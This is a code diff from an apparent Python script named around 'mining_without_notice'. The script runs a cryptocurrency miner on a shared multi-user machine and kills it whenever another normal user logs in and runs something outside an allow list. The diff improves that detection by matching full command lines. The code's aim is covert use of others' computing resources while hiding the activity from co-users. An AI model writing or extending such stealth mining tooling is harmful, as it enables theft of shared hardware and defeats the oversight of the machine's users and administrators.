@@ -10,8 +10,12 @@ import getpass
 mining_is_on = False
 miner_process = None
 
-allow_list = ['zsh', 'sftp-server', 'sshd', 'sshdemd', 'sh', 'ssh', 'sftp', 'bash', 'tmux', 'htop', 'watch', 'systemd', '(sd-pam)', 'gpustat', \
-                'dbus-launch', 'dbus-daemon', 'at-spi-bus-laun', 'at-spi2-registr', 'tcsh', 'mosh-server', 'git-credential-', 'vim']
+allow_list = ['zsh', 'sftp-server', 'sshd', 'sshdemd', 'sh', 'ssh',
+                'sftp', 'bash', 'tmux', 'htop', 'watch', 'systemd',
+                '(sd-pam)', 'gpustat','dbus-launch', 'dbus-daemon',
+                'at-spi-bus-laun', 'at-spi2-registr', 'tcsh', 'gpusta',
+                 'mosh-server', 'git-credential-', 'vim',
+                 'python2 -m SimpleHTTPServer']
 
 def get_normal_users():
     rtn = list()
@@ -46,15 +50,16 @@ def mining_without_notice(mining_url):
     normal_users = get_normal_users()
 
     someone_else_detected = False
-    top_read = os.popen('top -n 1 -b').read()
+    top_read = os.popen('top -n 1 -b -c').read()
     top_read = top_read.splitlines()[7:]
     for line in top_read:
         user_name = line.split()[1]
         status = line.split()[7]
-        process = line.split()[11]
+        process = ' '.join(x for x in line.split()[11:])
         if user_name in normal_users and user_name != this_user:
-            if process not in allow_list: # the process is running
+            if not any(allowed_process in process for allowed_process in allow_list):
                 print('Someone else logins and running!', user_name, process)
+                print(line)
                 someone_else_detected = True
                 if mining_is_on:
                     # kill the miner
